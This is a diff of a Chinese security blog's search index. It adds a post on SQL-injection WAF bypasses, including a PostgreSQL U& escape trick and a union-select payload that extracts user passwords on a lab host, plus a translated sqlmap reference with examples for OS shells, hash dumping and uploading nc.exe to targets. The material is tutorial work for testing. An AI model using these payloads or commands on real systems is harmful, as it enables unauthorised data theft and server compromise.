@@ -288,6 +288,7 @@
         <category>SQL注入</category>
       </categories>
       <tags>
+        <tag>SQL注入</tag>
         <tag>WAF-Bypass</tag>
       </tags>
   </entry>
@@ -2103,7 +2104,6 @@
 <p>得出可以使用<code>/*//*/</code>代替空格来进行绕过获取数据</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+union/*//*/select 1,concat_ws(char(32,58,32),user,password) from/*//*/users+%23&amp;Submit=Submit#</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2021/10/16/ZkhTPXifCQYWKIr.png" alt="image-20211016150953965"></p>
-<p>​    </p>
 <h2 id="Bypass安全狗SQLServer注入"><a href="#Bypass安全狗SQLServer注入" class="headerlink" title="Bypass安全狗SQLServer注入"></a>Bypass安全狗SQLServer注入</h2><h3 id="SQLServer特性"><a href="#SQLServer特性" class="headerlink" title="SQLServer特性"></a>SQLServer特性</h3><p><strong>空格可以由其它字符替代</strong></p>
 <blockquote>
 <p>select id,contents,time from news where news_id=1<span style="color:red">①</span>union<span style="color:red">②</span>select<span style="color:red">③</span>1,2,db_name()<span style="color:red">④</span>from<span style="color:red">⑤</span>admin</p>
@@ -2172,6 +2172,7 @@
         <category>SQL注入</category>
       </categories>
       <tags>
+        <tag>SQL注入</tag>
         <tag>WAF-Bypass</tag>
       </tags>
   </entry>
@@ -4892,6 +4893,7 @@
         <category>SQL注入</category>
       </categories>
       <tags>
+        <tag>SQL注入</tag>
         <tag>WAF-Bypass</tag>
       </tags>
   </entry>
@@ -4916,6 +4918,7 @@
         <category>SQL注入</category>
       </categories>
       <tags>
+        <tag>SQL注入</tag>
         <tag>WAF-Bypass</tag>
       </tags>
   </entry>
@@ -4954,6 +4957,7 @@
         <category>SQL注入</category>
       </categories>
       <tags>
+        <tag>SQL注入</tag>
         <tag>WAF-Bypass</tag>
       </tags>
   </entry>
@@ -5277,13 +5281,720 @@
 <h3 id="静态文件绕过"><a href="#静态文件绕过" class="headerlink" title="静态文件绕过"></a>静态文件绕过</h3><p>除了白名单信任文件和目录外，还有一部分 waf 并不会对静态文件进行拦截。 例如 图片文件 jpg 、png 、gif 或者 css 、js 会对这些静态文件的操作不会 进行检测从而绕过 waf 拦截。</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="number">1.</span>jpg<span class="operator">&amp;</span>name<span class="operator">=</span>vince<span class="operator">+</span><span class="operator">&amp;</span>submit<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="number">1.</span>jpg<span class="operator">=</span><span class="operator">/</span><span class="number">1.</span>jpg<span class="operator">&amp;</span>name<span class="operator">=</span>vince<span class="operator">+</span><span class="operator">&amp;</span>submit<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="number">1.</span>css<span class="operator">=</span><span class="operator">/</span><span class="number">1.</span>css<span class="operator">&amp;</span>name<span class="operator">=</span>vince<span class="operator">+</span><span class="operator">&amp;</span>submit<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2021/11/01/j6q3iExLdB59h2S.png" alt="image-20211101230701225"></p>
+<h3 id="PostgreSQL字符串特性绕过"><a href="#PostgreSQL字符串特性绕过" class="headerlink" title="PostgreSQL字符串特性绕过"></a>PostgreSQL字符串特性绕过</h3><p>由于 postgres 会将双引号中的内容认为是一个表名/字段名，同时在双引号引起的字符串中使用 U&amp; 前缀转义是合法的，所以当过滤了 information_schema 等关键名称时，可以将其用双引号引用并在其前面 加入 U&amp;转义前缀，同时将其中某个字符替换为对应的 Unicode 表现形式来绕过 WAF。</p>
+<p>例如：以下语句同样会返回所有的 Schema</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> U<span class="operator">&amp;</span>&quot;tabl\0065_sch\0065ma&quot; <span class="keyword">from</span> U<span class="operator">&amp;</span>&quot;inform\0061tion_sch\0065ma&quot;.U<span class="operator">&amp;</span>&quot;t\0061bles&quot; <span class="keyword">where</span> </span><br><span class="line">U<span class="operator">&amp;</span>&quot;tabl\0065_sch\0065ma&quot; <span class="keyword">not</span> <span class="keyword">in</span> (U<span class="operator">&amp;</span><span class="string">&#x27;pg_cat\0061log&#x27;</span>,U<span class="operator">&amp;</span><span class="string">&#x27;inform\0061tion_sch\0065ma&#x27;</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>Web安全</category>
         <category>SQL注入</category>
       </categories>
       <tags>
+        <tag>SQL注入</tag>
         <tag>WAF-Bypass</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqlmap的使用技巧</title>
+    <url>/post/774ae9de.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="sqlmap介绍"><a href="#sqlmap介绍" class="headerlink" title="sqlmap介绍"></a>sqlmap介绍</h2><p>sqlmap是一个开源的、国内外著名的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型的数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件，甚至可以通过外带数据连接的方式执行操作系统命令。</p>
+<p>sqlmap支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB等数据库的各种安全漏洞检测。</p>
+<p>sqlmap支持一下5种不同的注入模式。</p>
+<ol>
+<li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li>
+<li>基于时间的盲注，即不能根据页面返回的内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
+<li>基于报错注入，即页面返回错误信息，或者把注入语句结果直接返回在主页中。</li>
+<li>联合查询注入，可以使用union的情况下的注入。</li>
+<li>堆叠查询注入，即执行多条SQL语句构造的注入。</li>
+</ol>
+<p>官方网站：<a href="https://sqlmap.org/">https://sqlmap.org/</a></p>
+<p>下载地址：<a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
+<h2 id="sqlmap使用参数详解"><a href="#sqlmap使用参数详解" class="headerlink" title="sqlmap使用参数详解"></a>sqlmap使用参数详解</h2><p>本文以sqlmap 1.1.8-8版本为例，对其所有参数进行详细的分析和讲解，便于在使用时进行查询。</p>
+<p>用法: <code>sqlmap.py [选项]</code></p>
+<h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><ul>
+<li><p>-h，—help： 显示基本帮助信息并退出</p>
+</li>
+<li><p>-hh： 显示高级帮助信息并退出</p>
+</li>
+<li><p>—version： 显示程序版本信息并退出</p>
+</li>
+<li><p>-v VERBOSE信息级别： 0-6 （缺省1），其值具体含义如下：</p>
+<ul>
+<li>0 只显示python错误以及严重的信息；</li>
+<li>1 同时显示基本信息和警告信息（默认）；</li>
+<li>2 同时显示debug信息；</li>
+<li>3 同时显示注入的payload；</li>
+<li>4 同时显示HTTP请求；</li>
+<li>5 同时显示HTTP响应头；</li>
+<li>6 同时显示HTTP响应页面；</li>
+</ul>
+<p>如果想看到sqlmap发送的测试payload最好的等级就是3。</p>
+</li>
+</ul>
+<h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>在这些选项中必须提供至少有一个确定目标</p>
+<ul>
+<li>-d DIRECT： 直接连接数据库的连接字符串</li>
+<li>-u URL，—url=URL： 目标URL (如”<a href="http://www.site.com/vuln.php?id=1&quot;)，使用-u或者--url">http://www.site.com/vuln.php?id=1&quot;)，使用-u或者--url</a> </li>
+<li>-l LOGFILE： 从Burp或者WebScarab代理日志文件中分析目标</li>
+<li>-x SITEMAPURL： 从远程网站地图（sitemap.xml）文件来解析目标</li>
+<li>-m BULKFILE： 将目标地址保存在文件中，一行为一个URL地址进行批量检测</li>
+<li>-r REQUESTFILE： 从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如Cookie，POST数据，等等），请求是HTTPS的时需要配合这个—force-ssl参数来使用，或者可以在Host头后面加上:443</li>
+<li>-g GOOGLEDORK： 从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）</li>
+<li>-c CONFIGFILE： 从配置ini文件中加载选项</li>
+</ul>
+<h3 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h3><p>以下选项可以用来指定如何连接到目标URL。</p>
+<ul>
+<li><p>—method=METHOD： 强制使用给定的HTTP方法（例如put）</p>
+</li>
+<li><p>—data=DATA： 通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。</p>
+<p>—data=”id=1” -f —banner —dbs —users</p>
+</li>
+<li><p>—param-del=PARA.. 当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</p>
+</li>
+<li><p>—cookie=COOKIE： HTTP Cookie header 值</p>
+</li>
+<li><p>—cookie-del=COO： 用来分隔cookie的字符串值</p>
+</li>
+<li><p>—load-cookies=L： Filecontaining cookies in Netscape/wget format</p>
+</li>
+<li><p>—drop-set-cookie： IgnoreSet-Cookie header from response</p>
+</li>
+<li><p>—user-agent=AGENT： 默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx(<a href="http://sqlmap.org/">http://sqlmap.org</a>)可以使用—user-agent参数来修改，同时也可以使用—random-agent参数来随机的从./txt/user-agents.txt中获取。当—level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入</p>
+</li>
+<li><p>—random-agent： 使用random-agent作为HTTP User-Agent头值</p>
+</li>
+<li><p>—host=HOST： HTTP Hostheader value</p>
+</li>
+<li><p>—referer=REFERER： sqlmap可以在请求中伪造HTTP中的referer，当—level参数设定为3或者3以上的时候会尝试对referer注入</p>
+</li>
+<li><p>-H HEADER, —hea： 额外的http头(如”X-Forwarded-For: 127.0.0.1”)</p>
+</li>
+<li><p>—headers=HEADERS： 可以通过—headers参数来增加额外的http头(如”Accept-Language: fr\nETag: 123”)</p>
+</li>
+<li><p>—auth-type=AUTH： HTTP的认证类型 (Basic, Digest, NTLM or PKI)</p>
+</li>
+<li><p>—auth-cred=AUTH： HTTP 认证凭证(name:password)</p>
+</li>
+<li><p>—auth-file=AUTH： HTTP 认证PEM证书/私钥文件；当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file,key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。</p>
+</li>
+<li><p>—ignore-401： Ignore HTTPError 401 (Unauthorized)忽略HTTP 401错误（未授权的）</p>
+</li>
+<li><p>—ignore-proxy： 忽略系统的默认代理设置</p>
+</li>
+<li><p>—ignore-redirects： 忽略重定向的尝试</p>
+</li>
+<li><p>—ignore-timeouts： 忽略连接超时</p>
+</li>
+<li><p>—proxy=PROXY： 使用代理服务器连接到目标URL</p>
+</li>
+<li><p>—proxy-cred=PRO： 代理认证凭证(name:password)</p>
+</li>
+<li><p>—proxy-file=PRO：从文件加载代理列表</p>
+</li>
+<li><p>—tor： 使用Tor匿名网络</p>
+</li>
+<li><p>—tor-port=TORPORT： 设置Tor代理端口</p>
+</li>
+<li><p>—tor-type=TORTYPE： 设置Tor代理类型 (HTTP,SOCKS4 or SOCKS5 (缺省))</p>
+</li>
+<li><p>—check-tor： 检查Tor的是否正确使用</p>
+</li>
+<li><p>—delay=DELAY： 可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p>
+</li>
+<li><p>—timeout=TIMEOUT： 可以设定一个HTTP(S)请求超过多久判定为超时，10表示10秒，默认是30秒。</p>
+</li>
+<li><p>—retries=RETRIES： 当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</p>
+</li>
+<li><p>—randomize=RPARAM： 可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样</p>
+</li>
+<li><p>—safe-url=SAFEURL： 提供一个安全不错误的连接，每隔一段时间都会去访问一下</p>
+</li>
+<li><p>—safe-post=SAFE： 提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。</p>
+</li>
+<li><p>—safe-req=SAFER： 从文件中加载安全HTTP请求</p>
+</li>
+<li><p>—safe-freq=SAFE： 测试一个给定安全网址的两个访问请求</p>
+</li>
+<li><p>—skip-urlencode： 跳过URL的有效载荷数据编码</p>
+</li>
+<li><p>—csrf-token=CSR： 用来保存反CSRF令牌</p>
+</li>
+<li><p>—csrf-url=CSRFURL： URL地址访问提取anti-CSRF令牌</p>
+</li>
+<li><p>—force-ssl： 强制使用SSL/HTTPS</p>
+</li>
+<li><p>—hpp： 使用HTTP参数污染的方法</p>
+</li>
+<li><p>—eval=EVALCODE： 在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用—eval参数在每次请求时根据所写python代码做完修改后请求。(e.g “import hashlib;id2=hashlib.md5(id).hexdigest()”)</p>
+</li>
+</ul>
+<p>使用示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u&quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot;--eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><p>这些选项可用于优化sqlmap性能。</p>
+<ul>
+<li>-o： 打开所有的优化开关</li>
+<li>—predict-output： 预测普通查询输出</li>
+<li>—keep-alive： 使用持久HTTP（S）连接</li>
+<li>—null-connection： 获取页面长度</li>
+<li>—threads=THREADS： 当前http(s)最大请求数 (默认 1)</li>
+</ul>
+<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。</p>
+<ul>
+<li>-p TESTPARAMETER： 可测试的参数</li>
+<li>—skip=SKIP： 跳过对给定参数的测试</li>
+<li>—skip-static： 跳过测试不显示为动态的参数</li>
+<li>—param-exclude=： 使用正则表达式排除参数进行测试（如”ses”）</li>
+<li>—dbms=DBMS： 强制后端的DBMS为此值</li>
+<li>—dbms-cred=DBMS： DBMS认证凭证(user:password)</li>
+<li>—os=OS： 强制后端的DBMS操作系统为这个值</li>
+<li>—invalid-bignum： 使用大数字使值无效</li>
+<li>—invalid-logical： 使用逻辑操作使值无效</li>
+<li>—invalid-string： 使用随机字符串使值无效</li>
+<li>—no-cast： 关闭有效载荷铸造机制</li>
+<li>—no-escape： 关闭字符串逃逸机制</li>
+<li>—prefix=PREFIX： 注入payload字符串前缀</li>
+<li>—suffix=SUFFIX： 注入payload字符串后缀</li>
+<li>—tamper=TAMPER： 使用给定的脚本篡改注入数据</li>
+</ul>
+<h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容</p>
+<ul>
+<li>—level=LEVEL： 执行测试的等级（1-5，默认为1）</li>
+<li>—risk=RISK： 执行测试的风险（0-3，默认为1）</li>
+<li>—string=STRING： 查询时有效时在页面匹配字符串</li>
+<li>—not-string=NOT： 当查询求值为无效时匹配的字符串</li>
+<li>—regexp=REGEXP： 查询时有效时在页面匹配正则表达式</li>
+<li>—code=CODE： 当查询求值为True时匹配的HTTP代码</li>
+<li>—text-only： 仅基于在文本内容比较网页</li>
+<li>—titles： 仅根据他们的标题进行比较</li>
+</ul>
+<h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><p> 这些选项可用于调整具体的SQL注入测试。</p>
+<ul>
+<li>—technique=TECH： SQL注入技术测试（默认BEUST）<ul>
+<li>B： Boolean-based blind（布尔型盲注）</li>
+<li>E： Error-based （报错型注入）</li>
+<li>U： Union query-based（联合查询注入）</li>
+<li>S： Stacked queries（多语句查询注入）</li>
+<li>T：Time-based blind（时间型盲注）</li>
+<li>Q： Inline queries（嵌套查询注入）</li>
+</ul>
+</li>
+<li>—time-sec=TIMESEC： DBMS响应的延迟时间（默认为5秒）</li>
+<li>—union-cols=UCOLS： 定列范围用于测试UNION查询注入</li>
+<li>—union-char=UCHAR： 暴力猜测列的字符数</li>
+<li>—union-from=UFROM： SQL注入UNION查询使用的格式</li>
+<li>—dns-domain=DNS： DNS泄露攻击使用的域名</li>
+<li>—second-order=S： URL搜索产生的结果页面</li>
+</ul>
+<h3 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h3><ul>
+<li>-f，—fingerprint： 执行广泛的DBMS版本指纹检查</li>
+</ul>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>以下选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行自定义的SQL语句。</p>
+<ul>
+<li>-a，—all： 获取所有信息</li>
+<li>-b，—banner： 获取数据库管理系统的标识</li>
+<li>—current-user： 获取数据库管理系统当前用户</li>
+<li>—current-db： 获取数据库管理系统当前数据库</li>
+<li>—hostname： 获取数据库服务器的主机名称</li>
+<li>—is-dba： 检测DBMS当前用户是否DBA</li>
+<li>—users： 枚举数据库管理系统用户</li>
+<li>—passwords： 枚举数据库管理系统用户密码哈希</li>
+<li>—privileges： 枚举数据库管理系统用户的权限</li>
+<li>—roles： 枚举数据库管理系统用户的角色</li>
+<li>—dbs： 枚举数据库管理系统数据库</li>
+<li>—tables： 枚举的DBMS数据库中的表</li>
+<li>—columns： 枚举DBMS数据库表列</li>
+<li>—schema： 枚举数据库架构</li>
+<li>—count： 检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap.py -u url —count -D testdb</li>
+<li>—dump： 转储数据库表项</li>
+<li>—dump-all： 转储数据库所有表项</li>
+<li>—search： 搜索列（S），表（S）和/或数据库名称（S）</li>
+<li>—comments： 获取DBMS注释</li>
+<li>-D DB： 要进行枚举的指定数据库名</li>
+<li>-T TBL： DBMS数据库表枚举</li>
+<li>-C COL： DBMS数据库表列枚举</li>
+<li>-X EXCLUDECOL： DBMS数据库表不进行枚举</li>
+<li>-U USER： 用来进行枚举的数据库用户</li>
+<li>—exclude-sysdbs： 枚举表时排除系统数据库</li>
+<li>—pivot-column=P： Pivot columnname</li>
+<li>—where=DUMPWHERE： Use WHEREcondition while table dumping</li>
+<li>—start=LIMITSTART： 获取第一个查询输出数据位置</li>
+<li>—stop=LIMITSTOP： 获取最后查询的输出数据</li>
+<li>—first=FIRSTCHAR： 第一个查询输出字的字符获取</li>
+<li>—last=LASTCHAR： 最后查询的输出字字符获取</li>
+<li>—sql-query=QUERY： 要执行的SQL语句</li>
+<li>—sql-shell： 提示交互式SQL的shell</li>
+<li>—sql-file=SQLFILE： 要执行的SQL文件</li>
+</ul>
+<h3 id="暴力"><a href="#暴力" class="headerlink" title="暴力"></a>暴力</h3><p>以下选项可以被用来运行暴力检查。</p>
+<ul>
+<li>—common-tables   检查存在共同表</li>
+<li>—common-columns  检查存在共同列</li>
+</ul>
+<h3 id="用户自定义函数注入"><a href="#用户自定义函数注入" class="headerlink" title="用户自定义函数注入"></a>用户自定义函数注入</h3><p>以下选项可以用来创建用户自定义函数。</p>
+<ul>
+<li>—udf-inject： 注入用户自定义函数</li>
+<li>—shared-lib=SHLIB： 共享库的本地路径</li>
+</ul>
+<h3 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h3><p>以下选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
+<ul>
+<li><p>—file-read=RFILE： 从后端的数据库管理系统文件系统读取文件，SQL Server2005中读取二进制文件example.exe：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u&quot;http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther&quot;--file-read &quot;C:/example.exe&quot; -v 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>—file-write=WFILE： 编辑后端的数据库管理系统文件系统上的本地文件</p>
+</li>
+<li><p>—file-dest=DFILE： 后端的数据库管理系统写入文件的绝对路径</p>
+<p>在kali中将/software/nc.exe文件上传到C:/WINDOWS/Temp下： </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u&quot;http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1&quot; --file-write&quot;/software/nc.exe&quot; --file-dest &quot;C:/WINDOWS/Temp/nc.exe&quot; -v1</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="操作系统访问"><a href="#操作系统访问" class="headerlink" title="操作系统访问"></a>操作系统访问</h3><p>以下选项可以用于访问后端数据库管理系统的底层操作系统。</p>
+<ul>
+<li>—os-cmd=OSCMD： 执行操作系统命令（OSCMD）</li>
+<li>—os-shell： 交互式的操作系统的shell</li>
+<li>—os-pwn： 获取一个OOB shell，meterpreter或VNC</li>
+<li>—os-smbrelay： 一键获取一个OOBshell，meterpreter或VNC</li>
+<li>—os-bof： 存储过程缓冲区溢出利用</li>
+<li>—priv-esc： 数据库进程用户权限提升</li>
+<li>—msf-path=MSFPATH： MetasploitFramework本地的安装路径</li>
+<li>—tmp-path=TMPPATH： 远程临时文件目录的绝对路径</li>
+</ul>
+<p>使用示例：linux查看当前用户命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u&quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot; --os-cmd id -v1</span><br></pre></td></tr></table></figure>
+<h3 id="Windows注册表访问"><a href="#Windows注册表访问" class="headerlink" title="Windows注册表访问"></a>Windows注册表访问</h3><p>以下选项可以被用来访问后端数据库管理系统Windows注册表。</p>
+<ul>
+<li>—reg-read： 读一个Windows注册表项值</li>
+<li>—reg-add： 写一个Windows注册表项值数据</li>
+<li>—reg-del： 删除Windows注册表键值</li>
+<li>—reg-key=REGKEY： Windows注册表键</li>
+<li>—reg-value=REGVAL： Windows注册表项值</li>
+<li>—reg-data=REGDATA： Windows注册表键值数据</li>
+<li>—reg-type=REGTYPE： Windows注册表项值类型</li>
+</ul>
+<h3 id="一般选项"><a href="#一般选项" class="headerlink" title="一般选项"></a>一般选项</h3><p>以下选项可以用来设置一些一般的工作参数。</p>
+<ul>
+<li><p>-s SESSIONFILE： 保存和恢复检索会话文件的所有数据</p>
+</li>
+<li><p>-t TRAFFICFILE： 记录所有HTTP流量到一个文本文件中</p>
+</li>
+<li><p>—batch： 从不询问用户输入，使用所有默认配置。</p>
+</li>
+<li><p>—binary-fields=： 结果字段具有二进制值(如”digest”)</p>
+</li>
+<li><p>—charset=CHARSET： 强制字符编码</p>
+</li>
+<li><p>—crawl=CRAWLDEPTH： 从目标URL爬行网站</p>
+</li>
+<li><p>—crawl-exclude=： 正则表达式从爬行页中排除</p>
+</li>
+<li><p>—csv-del=CSVDEL： 限定使用CSV输出 (default”,”)</p>
+</li>
+<li><p>—dump-format=DU： 转储数据格式(CSV(default), HTML or SQLITE)</p>
+</li>
+<li><p>—eta： 显示每个输出的预计到达时间</p>
+</li>
+<li><p>—flush-session： 刷新当前目标的会话文件</p>
+</li>
+<li><p>—forms： 解析和测试目标URL表单</p>
+</li>
+<li><p>—fresh-queries： 忽略在会话文件中存储的查询结果</p>
+</li>
+<li><p>—hex： 使用DBMS Hex函数数据检索</p>
+</li>
+<li><p>—output-dir=OUT： 自定义输出目录路径</p>
+</li>
+<li>—parse-errors： 解析和显示响应数据库错误信息</li>
+<li><p>—save=SAVECONFIG： 保存选项到INI配置文件</p>
+</li>
+<li><p>—scope=SCOPE： 从提供的代理日志中使用正则表达式过滤目标</p>
+</li>
+<li><p>—test-filter=TE： 选择测试的有效载荷和/或标题(如 ROW)</p>
+</li>
+<li>—test-skip=TEST： 跳过试验载荷和/或标题(如 BENCHMARK)</li>
+<li>—update： 更新sqlmap</li>
+</ul>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
+<li>-z： MNEMONICS使用短记忆法 (如”flu,bat,ban,tec=EU”)</li>
+<li><p>—alert=ALERT： 发现SQL注入时，运行主机操作系统命令</p>
+</li>
+<li><p>—answers=ANSWERS： 当希望sqlmap提出输入时，自动输入自己想要的答案(如 “quit=N,follow=N”)，例如：sqlmap.py -u”<a href="http://192.168.22.128/get_int.php?id=1&quot;--technique=E--answers=&quot;extending=N">http://192.168.22.128/get_int.php?id=1&quot;--technique=E--answers=&quot;extending=N</a>“ —batch</p>
+</li>
+<li>—beep： 发现sql注入时，发出蜂鸣声。</li>
+<li>—cleanup： 清除sqlmap注入时在DBMS中产生的udf与表。</li>
+<li>—dependencies： 在某些特殊情况下，sqlmap需要独立安装额外的第三方库（例如，选项-d直接连接数据库，开关—os-pwn使用icmpsh隧道，选项 —auth-type 对于NTLM类型的HTTP认证等），只在这种特殊情况下会警告用户。不过，如果想独立检查所有额外的第三方库依赖关系，可以使用开关 —dependcies。</li>
+<li>—disable-coloring： 默认彩色输出，禁掉彩色输出。</li>
+<li><p>—gpage=GOOGLEPAGE: 使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试</p>
+</li>
+<li><p>—identify-waf： 进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别</p>
+</li>
+<li><p>—mobile： 有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。</p>
+</li>
+<li><p>—offlineWork： 在离线模式下工作</p>
+</li>
+<li><p>—purge-output： 从输出目录安全删除所有内容，有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。</p>
+</li>
+<li><p>—skip-waf： 跳过WAF/IPS/IDS启发式检测保护</p>
+</li>
+<li><p>—smart： 进行积极的启发式测试，快速判断为注入的报错点进行注入</p>
+</li>
+<li><p>—sqlmap-shell： 互动提示一个sqlmapshell</p>
+</li>
+<li><p>—tmp-dir=TMPDIR： 用于存储临时文件的本地目录</p>
+</li>
+<li><p>—web-root=WEBROOT： Web服务器的文档根目录(如”/var/www”)</p>
+</li>
+<li>—wizard： 新手用户简单的向导使用，可以一步一步教你如何输入针对目标注入</li>
+</ul>
+<h2 id="sqlmap使用实例"><a href="#sqlmap使用实例" class="headerlink" title="sqlmap使用实例"></a>sqlmap使用实例</h2><h3 id="GET注入自动检测"><a href="#GET注入自动检测" class="headerlink" title="GET注入自动检测"></a>GET注入自动检测</h3><p>检测语法：<code>sqlmap -u &quot;http://hackrock.com:811/Less-1/index.php?id=1&quot; --dbs</code></p>
+<p>技巧：在实际检测过程中，sqlmap会不停的询问，需要手工输入<code>Y/N</code>来进行下一步操作，可以使用参数<code>--batch</code>命令来自动答复和判断。</p>
+<h3 id="POST注入自动检测"><a href="#POST注入自动检测" class="headerlink" title="POST注入自动检测"></a>POST注入自动检测</h3><h4 id="方式一：日志文件加载"><a href="#方式一：日志文件加载" class="headerlink" title="方式一：日志文件加载"></a>方式一：日志文件加载</h4><blockquote>
+<ul>
+<li>-l LOGFILE： 从Burp或者WebScarab代理日志文件中分析目标</li>
+</ul>
+</blockquote>
+<p>将BurpSuit抓包到的request请求内容复制到一个文本文件然后改名为<code>.log</code>后缀名的文件如下所示，然后进行注入。</p>
+<p><img src="https://i.loli.net/2021/11/02/asi7vI4XMpft3l9.png" alt="image-20211102220949167"></p>
+<p>sqlmap注入获取数据库信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -l test.log --dbs</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/11/02/Vhy1wXULeIModjZ.png" alt="image-20211102221208611"></p>
+<h4 id="方式二：文本文件加载"><a href="#方式二：文本文件加载" class="headerlink" title="方式二：文本文件加载"></a>方式二：文本文件加载</h4><blockquote>
+<ul>
+<li><p>-r REQUESTFILE： 从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如Cookie，POST数据，等等），请求是HTTPS的时需要配合这个—force-ssl参数来使用，或者可以在Host头后面加上:443</p>
+</li>
+<li><p>-p TESTPARAMETER： 可测试的参数</p>
+</li>
+</ul>
+</blockquote>
+<p>将BurpSuit抓包到的request请求内容复制到一个文本文件，然后进行注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r test.txt -p id --dbs</span><br></pre></td></tr></table></figure>
+<h4 id="方法三：自动搜索表单"><a href="#方法三：自动搜索表单" class="headerlink" title="方法三：自动搜索表单"></a>方法三：自动搜索表单</h4><blockquote>
+<ul>
+<li>—forms： 解析和测试目标URL表单</li>
+</ul>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://hackrock.com:815/vul/sqli/sqli_id.php&quot; --forms --dbs</span><br></pre></td></tr></table></figure>
+<h4 id="方法四：指定数据参数"><a href="#方法四：指定数据参数" class="headerlink" title="方法四：指定数据参数"></a>方法四：指定数据参数</h4><blockquote>
+<ul>
+<li>—data=DATA： 通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。</li>
+</ul>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://hackrock.com:815/vul/sqli/sqli_id.php&quot; --data=&quot;id=1&quot; --dbs</span><br></pre></td></tr></table></figure>
